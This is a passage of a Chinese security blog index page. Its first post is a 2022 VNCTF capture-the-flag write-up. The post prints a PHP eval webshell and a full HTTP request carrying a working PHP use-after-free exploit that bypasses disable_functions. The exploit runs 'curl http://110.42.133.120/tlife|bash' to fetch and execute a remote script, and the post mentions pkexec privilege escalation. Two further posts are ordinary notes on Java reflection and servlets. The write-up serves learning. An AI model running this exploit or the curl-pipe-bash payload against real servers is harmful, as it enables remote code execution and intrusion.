<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">203</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/22/2022vnctf-redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce/">2022vnctf-rce小结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-22</time><div class="content"><h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><h2 id="非预期——pkexec提权"><a href="#非预期——pkexec提权" class="headerlink" title="非预期——pkexec提权"></a>非预期——pkexec提权</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> highlight_file(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>测试了一下，可以使用file_put_contents，但是其他的命令执行不了</p>
<p>我们可以查看一下disable_function,但是由于phpinfo()用不了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(ini_get_all());</span><br></pre></td></tr></table></figure>

<p>可以发现disable_function过滤了很多东西，应该就是要绕了</p>
<p>既然可以写入文件，先试试一些disable_function实现rce</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">https://github.com/mm0r1/exploits</a></p>
<p>这里有个思路也很巧妙，学习一下，就是通过发送文件的形式，这样的话，就不用一直使用file_put_contents去写文件命令执行，可以直接在一个页面</p>
<p>但是需要注意发送文件的格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;1&quot;</span><br><span class="line"></span><br><span class="line">var_dump(&quot;a&quot;);</span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29--</span><br></pre></td></tr></table></figure>

<p>然后将rce的脚本贴过来，但是不能马上用，因为disable_function中过滤了fwrite，需要找替代，使用fputs,使用CVE-2021-4034进行提权</p>
<p>使用一个脚本上传一下，我一直在想如何将文件写入，因为怎么写好像都有问题。</p>
<p>其实可以将他放在服务器上，然后利用curl命令下载过去。又掌握一个新姿势。。。我还在一直用python脚本写，而且穿过去以后，我发现使用那边的gcc也没法编译成功。。。</p>
<p>所以我直接在服务器编译了，然后发送过去</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220222202334.png" alt="img" style="zoom:67%;">

<p>完整命令执行内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?exp&#x3D;eval($_POST[1]); HTTP&#x2F;1.1</span><br><span class="line">Host: c9be48e4-3f0c-4ebd-8cc6-ba5f826890d0.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko&#x2F;20100101 Firefox&#x2F;97.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid&#x3D;17c6332d1772a3-003cfe433760328-4c3e2679-144000-17c6332d178a88</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Length: 6949</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;1&quot;</span><br><span class="line"></span><br><span class="line">pwn(&#39;curl http:&#x2F;&#x2F;110.42.133.120&#x2F;tlife|bash &#39;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    define(&#39;LOGGING&#39;, false);</span><br><span class="line">    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);</span><br><span class="line">    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);</span><br><span class="line">    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);</span><br><span class="line">    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);</span><br><span class="line">    define(&#39;CMD&#39;, $cmd);</span><br><span class="line">    for($i &#x3D; 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">        $groom[] &#x3D; Pwn::alloc(STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);</span><br><span class="line">    $fd &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">    stream_filter_append($fd,&#39;pwn_filter&#39;);</span><br><span class="line">    fputs($fd, &#39;x&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Helper &#123; public $a, $b, $c; &#125;</span><br><span class="line">class Pwn extends php_user_filter &#123;</span><br><span class="line">    private $abc, $abc_addr;</span><br><span class="line">    private $helper, $helper_addr, $helper_off;</span><br><span class="line">    private $uafp, $hfp;</span><br><span class="line"></span><br><span class="line">    public function filter($in, $out, &amp;$consumed, $closing) &#123;</span><br><span class="line">        if($closing) return;</span><br><span class="line">        stream_bucket_make_writeable($in);</span><br><span class="line">        $this-&gt;filtername &#x3D; Pwn::alloc(STRING_SIZE);</span><br><span class="line">        fclose($this-&gt;stream);</span><br><span class="line">        $this-&gt;go();</span><br><span class="line">        return PSFS_PASS_ON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function go() &#123;</span><br><span class="line">        $this-&gt;abc &#x3D; &amp;$this-&gt;filtername;</span><br><span class="line"></span><br><span class="line">        $this-&gt;make_uaf_obj();</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper &#x3D; new Helper;</span><br><span class="line">        $this-&gt;helper-&gt;b &#x3D; function($x) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper_addr &#x3D; $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;</span><br><span class="line">        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;abc_addr &#x3D; $this-&gt;helper_addr - CHUNK_SIZE;</span><br><span class="line">        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;helper_off &#x3D; $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;</span><br><span class="line"></span><br><span class="line">        $helper_handlers &#x3D; $this-&gt;str2ptr(CHUNK_SIZE);</span><br><span class="line">        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);</span><br><span class="line"></span><br><span class="line">        $this-&gt;prepare_leaker();</span><br><span class="line"></span><br><span class="line">        $binary_leak &#x3D; $this-&gt;read($helper_handlers + 8);</span><br><span class="line">        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);</span><br><span class="line">        $this-&gt;prepare_cleanup($binary_leak);</span><br><span class="line"></span><br><span class="line">        $closure_addr &#x3D; $this-&gt;str2ptr($this-&gt;helper_off + 0x38);</span><br><span class="line">        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);</span><br><span class="line"></span><br><span class="line">        $closure_ce &#x3D; $this-&gt;read($closure_addr + 0x10);</span><br><span class="line">        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);</span><br><span class="line"></span><br><span class="line">        $basic_funcs &#x3D; $this-&gt;get_basic_funcs($closure_ce);</span><br><span class="line">        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);</span><br><span class="line"></span><br><span class="line">        $zif_system &#x3D; $this-&gt;get_system($basic_funcs);</span><br><span class="line">        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);</span><br><span class="line"></span><br><span class="line">        $fake_closure_off &#x3D; $this-&gt;helper_off + CHUNK_SIZE * 2;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; 0x138; $i +&#x3D; 8) &#123;</span><br><span class="line">            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;write($fake_closure_off + 0x38, 1, 4);</span><br><span class="line"></span><br><span class="line">        $handler_offset &#x3D; PHP_MAJOR_VERSION &#x3D;&#x3D;&#x3D; 8 ? 0x70 : 0x68;</span><br><span class="line">        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);</span><br><span class="line"></span><br><span class="line">        $fake_closure_addr &#x3D; $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;</span><br><span class="line">        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);</span><br><span class="line">        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);</span><br><span class="line"></span><br><span class="line">        $this-&gt;cleanup();</span><br><span class="line">        ($this-&gt;helper-&gt;b)(CMD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function make_uaf_obj() &#123;</span><br><span class="line">        $this-&gt;uafp &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));</span><br><span class="line">        for($i &#x3D; 0; $i &lt; STRING_SIZE; $i++) &#123;</span><br><span class="line">            fputs($this-&gt;uafp, &quot;\x00&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function prepare_leaker() &#123;</span><br><span class="line">        $str_off &#x3D; $this-&gt;helper_off + CHUNK_SIZE + 8;</span><br><span class="line">        $this-&gt;write($str_off, 2);</span><br><span class="line">        $this-&gt;write($str_off + 0x10, 6);</span><br><span class="line"></span><br><span class="line">        $val_off &#x3D; $this-&gt;helper_off + 0x48;</span><br><span class="line">        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);</span><br><span class="line">        $this-&gt;write($val_off + 8, 0xA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function prepare_cleanup($binary_leak) &#123;</span><br><span class="line">        $ret_gadget &#x3D; $binary_leak;</span><br><span class="line">        do &#123;</span><br><span class="line">            --$ret_gadget;</span><br><span class="line">        &#125; while($this-&gt;read($ret_gadget, 1) !&#x3D;&#x3D; 0xC3);</span><br><span class="line">        $this-&gt;log(&quot;ret gadget &#x3D; 0x%x&quot;, $ret_gadget);</span><br><span class="line">        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION &#x3D;&#x3D;&#x3D; 8 ? 0x50 : 0x60));</span><br><span class="line">        $this-&gt;write(8, $ret_gadget);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read($addr, $n &#x3D; 8) &#123;</span><br><span class="line">        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);</span><br><span class="line">        $value &#x3D; strlen($this-&gt;helper-&gt;c);</span><br><span class="line">        if($n !&#x3D;&#x3D; 8) &#123; $value &amp;&#x3D; (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write($p, $v, $n &#x3D; 8) &#123;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $this-&gt;abc[$p + $i] &#x3D; chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_basic_funcs($addr) &#123;</span><br><span class="line">        while(true) &#123;</span><br><span class="line">            &#x2F;&#x2F; In rare instances the standard module might lie after the addr we&#39;re starting</span><br><span class="line">            &#x2F;&#x2F; the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br><span class="line">            &#x2F;&#x2F; In that case, changing the direction of the search should fix the crash.</span><br><span class="line">            &#x2F;&#x2F; $addr +&#x3D; 0x10;</span><br><span class="line">            $addr -&#x3D; 0x10;</span><br><span class="line">            if($this-&gt;read($addr, 4) &#x3D;&#x3D;&#x3D; 0xA8 &amp;&amp;</span><br><span class="line">                in_array($this-&gt;read($addr + 4, 4),</span><br><span class="line">                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;</span><br><span class="line">                $module_name_addr &#x3D; $this-&gt;read($addr + 0x20);</span><br><span class="line">                $module_name &#x3D; $this-&gt;read($module_name_addr);</span><br><span class="line">                if($module_name &#x3D;&#x3D;&#x3D; 0x647261646e617473) &#123;</span><br><span class="line">                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);</span><br><span class="line">                    return $this-&gt;read($addr + 0x28);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr &#x3D; $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry &#x3D; $this-&gt;read($addr);</span><br><span class="line">            $f_name &#x3D; $this-&gt;read($f_entry, 6);</span><br><span class="line">            if($f_name &#x3D;&#x3D;&#x3D; 0x6d6574737973) &#123;</span><br><span class="line">                return $this-&gt;read($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr +&#x3D; 0x20;</span><br><span class="line">        &#125; while($f_entry !&#x3D;&#x3D; 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function cleanup() &#123;</span><br><span class="line">        $this-&gt;hfp &#x3D; fopen(&#39;php:&#x2F;&#x2F;memory&#39;, &#39;w&#39;);</span><br><span class="line">        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));</span><br><span class="line">        for($i &#x3D; 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;</span><br><span class="line">            fputs($this-&gt;hfp, &quot;\x00&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function str2ptr($p &#x3D; 0, $n &#x3D; 8) &#123;</span><br><span class="line">        $address &#x3D; 0;</span><br><span class="line">        for($j &#x3D; $n - 1; $j &gt;&#x3D; 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;&#x3D; 8;</span><br><span class="line">            $address |&#x3D; ord($this-&gt;abc[$p + $j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function ptr2str($ptr, $n &#x3D; 8) &#123;</span><br><span class="line">        $out &#x3D; &#39;&#39;;</span><br><span class="line">        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $out .&#x3D; chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function log($format, $val &#x3D; &#39;&#39;) &#123;</span><br><span class="line">        if(LOGGING) &#123;</span><br><span class="line">            printf(&quot;&#123;$format&#125;\n&quot;, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static function alloc($size) &#123;</span><br><span class="line">        return str_shuffle(str_repeat(&#39;A&#39;, $size));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryj28zfvoWVxnHdp29--</span><br></pre></td></tr></table></figure>

<h2 id="预期解-redis主从复制"><a href="#预期解-redis主从复制" class="headerlink" title="预期解:redis主从复制"></a>预期解:redis主从复制</h2><p>写马进去以后，发现有一份redis的账号密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/21/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">java反射机制</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-21</time><div class="content"><h2 id="如何理解反射"><a href="#如何理解反射" class="headerlink" title="如何理解反射"></a>如何理解反射</h2><p>反射可以理解为一种手段，对象通过反射可以获取他的类，类可以通过反射获取他的所有方法，通过反射，我们可以将java这种静态语言附加上动态特性。</p>
<p><strong>这种动态获取的信息以及动态调用对象的功能成为java语言的反射机制</strong></p>
<h3 id="如何理解动态特性"><a href="#如何理解动态特性" class="headerlink" title="如何理解动态特性"></a>如何理解动态特性</h3><p>⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化</p>
<h2 id="获取类对象的方法"><a href="#获取类对象的方法" class="headerlink" title="获取类对象的方法"></a>获取类对象的方法</h2><h3 id="1-forname-方法"><a href="#1-forname-方法" class="headerlink" title="1.forname()方法"></a>1.forname()方法</h3><p>通过动态修改forname的参数，可以获取不同的java类</p>
<p>并且其静态方法JVM会装在类，并且执行static()中的代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class reflect_test &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">        Class name&#x3D; Class.forName(&quot;xxxx&quot;);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-直接获取"><a href="#2-直接获取" class="headerlink" title="2.直接获取"></a>2.直接获取</h3><p>任何数据类型都具备静态的属性，因此可以使用.class直接获取其对应的class对象,需要明确用到类中的静态成员</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class&lt;?&gt; name&#x3D;Runtime.class;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-使用getclass-方法"><a href="#3-使用getclass-方法" class="headerlink" title="3.使用getclass()方法"></a>3.使用getclass()方法</h3><p>我们可以通过object类中的getclass()方法来获取字节码对象<br><strong>需要明确具体的类，然后创建对象</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Runtime rt&#x3D; Runtime.getRuntime();</span><br><span class="line">    Class&lt;?&gt; name&#x3D;rt.getClass();</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-使用getSystemClassLoader-loadClass"><a href="#4-使用getSystemClassLoader-loadClass" class="headerlink" title="4.使用getSystemClassLoader().loadClass()"></a>4.使用getSystemClassLoader().loadClass()</h3><p>1.类似于forName()</p>
<p>但是不会执行static中的代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class&lt;?&gt; name&#x3D;ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h2><h3 id="1-getDeclaredMethods方法"><a href="#1-getDeclaredMethods方法" class="headerlink" title="1.getDeclaredMethods方法"></a>1.getDeclaredMethods方法</h3><p>getDeclaredMethods方法 返回类或接口声明的所有办法，包括public、protected、private、和默认方法，但不包括继承的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">public class getfunction &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">        Class name&#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Method[] declaredMethods&#x3D;name.getDeclaredMethods();</span><br><span class="line">        System.out.println(&quot;通过getDeclaredMethods获取的方法有:&quot;);</span><br><span class="line">        for(Method m:declaredMethods)</span><br><span class="line">            System.out.println(m);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-getMethods方法"><a href="#2-getMethods方法" class="headerlink" title="2.getMethods方法"></a>2.getMethods方法</h3><p>getMethods方法返回某个类的所有public方法，包括其继承类的public方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException&#123;</span><br><span class="line">    Class name&#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    Method[] declaredMethods&#x3D;name.getMethods();</span><br><span class="line">    System.out.println(&quot;通过getMethods获取的方法有:&quot;);</span><br><span class="line">    for(Method m:declaredMethods)</span><br><span class="line">        System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-getMethod方法"><a href="#3-getMethod方法" class="headerlink" title="3.getMethod方法"></a>3.getMethod方法</h3><p>只能返回一个特定的方法，如Runtime类中的exec方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应class的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException&#123;</span><br><span class="line">    Runtime rt&#x3D;Runtime.getRuntime();</span><br><span class="line">    Class&lt;?&gt; name&#x3D; rt.getClass();</span><br><span class="line">    Method method&#x3D;name.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">    System.out.println(&quot;通过getMethods获取的方法有:&quot;);</span><br><span class="line">    System.out.println(method);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-getDeclaredMethod方法"><a href="#4-getDeclaredMethod方法" class="headerlink" title="4.getDeclaredMethod方法"></a>4.getDeclaredMethod方法</h3><p>getDeclaredMethod方法和getMethod类似</p>
<h2 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h2><h3 id="1-getDeclaredFields方法"><a href="#1-getDeclaredFields方法" class="headerlink" title="1.getDeclaredFields方法"></a>1.getDeclaredFields方法</h3><p>getDeclaredFields能获得类的成员变量数组，包括public、private、protected，但是不包括父类的声明字段</p>
<h3 id="2-getFields方法"><a href="#2-getFields方法" class="headerlink" title="2.getFields方法"></a>2.getFields方法</h3><p>getFields能够获得某个类的所有public字段，包括父类中的字段，</p>
<h3 id="3-getDeclaredField方法"><a href="#3-getDeclaredField方法" class="headerlink" title="3.getDeclaredField方法"></a>3.getDeclaredField方法</h3><p>只能获得类的单个成员变量</p>
<h3 id="4-getField方法"><a href="#4-getField方法" class="headerlink" title="4.getField方法"></a>4.getField方法</h3><p>类似getFields方法，能够获得某个类特定的public字段，包括父类中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; name&#x3D;student.getClass()</span><br><span class="line">Field getField&#x3D;name.getField(&quot;content&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>forNam</code>e不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就是java.lang.Class对象：</p>
<p><code>obj.getClass()</code> 如果上下⽂中存在某个类的实例obj，那么我们可以直接通过obj.getClass()来获取它的类<br><code>Test.class </code>如果你已经加载了某个类，只是想获取到它的java.lang.Class对象，那么就直接拿它的class属性即可。这个⽅法其实不属于反射。<code>Class.forName </code>如果你知道某个类的名字，想获取到这个类，就可以使⽤forName来获取</p>
<h2 id="反射如何利用"><a href="#反射如何利用" class="headerlink" title="反射如何利用"></a>反射如何利用</h2><p>在java中Runtime是可以命令执行的类，那么如何拿到呢？，可以通过</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/21/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/">java初探（二）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-21</time><div class="content"><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>写完的程序放在webapps</p>
<h3 id="如何创建一个java-web工程"><a href="#如何创建一个java-web工程" class="headerlink" title="如何创建一个java web工程"></a>如何创建一个java web工程</h3><h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><p>java servlet 是运行在web服务器或应用服务器上的程序，它是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层</p>
<p><strong>功能</strong><br>1.创建并返回基于客户请求的动态HTML页面<br>2.与数据库进行通信</p>
<h3 id="如何制作映射-让客户端访问到java类"><a href="#如何制作映射-让客户端访问到java类" class="headerlink" title="如何制作映射 让客户端访问到java类"></a>如何制作映射 让客户端访问到java类</h3><p>web.xml中，Servlet的配置在servlet标签中，有servlet和servlet-mapping标签组成，通过servlet-name实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;:声明servlet配置入口</span><br><span class="line">&lt;description&gt;:声明servlet描述信息</span><br><span class="line">&lt;display-name&gt;:定义web应用名字</span><br><span class="line">&lt;servlet-name&gt;:声明servlet名称以便在后面的映射时使用</span><br><span class="line">&lt;servlet-class&gt;:指定当前servlet对应的类的路径</span><br><span class="line">&lt;servlet-mapping&gt;:注册组件访问配置的路径入口</span><br><span class="line">&lt;servlet-name&gt;:指定上文配置的servlet的名称</span><br><span class="line">&lt;url-pattern&gt;:指定配置这个组件的访问路径</span><br></pre></td></tr></table></figure>

<p>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-name&gt;myservlet(java包名字)&lt;&#x2F;servlet-name&gt;</span><br><span class="line">	&lt;servlet-class&gt;路径&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">	&lt;servlet-name&gt;myservlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">	&lt;url-pattern&gt;声明浏览器访问的路径&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>而在Servlet3.0以上的版本中，web.xml可以配置的servlet属性，都可以通过@WebServlet的方式进行配置</p>
<h3 id="接口方法"><a href="#接口方法" class="headerlink" title="接口方法"></a>接口方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">init():初始化对象</span><br><span class="line">service():执行实际任务的主要方法</span><br><span class="line">doget()&#x2F;dopost()</span><br><span class="line">destory()接口：释放资源</span><br></pre></td></tr></table></figure>

<h2 id="java-web过滤器——filter"><a href="#java-web过滤器——filter" class="headerlink" title="java web过滤器——filter"></a>java web过滤器——filter</h2><p>filter是Servlet2.3新增的一个特性，能够实现对所有web资源的管理，实现权限访问控制，过滤敏感词汇，压缩响应信息等一些高级功能</p>
<p><strong>配置方式:1.基于web.xml 2.基于注解方式</strong></p>
<p>注意：使用注解方式配置filter，无法确定过滤器的执行顺序</p>
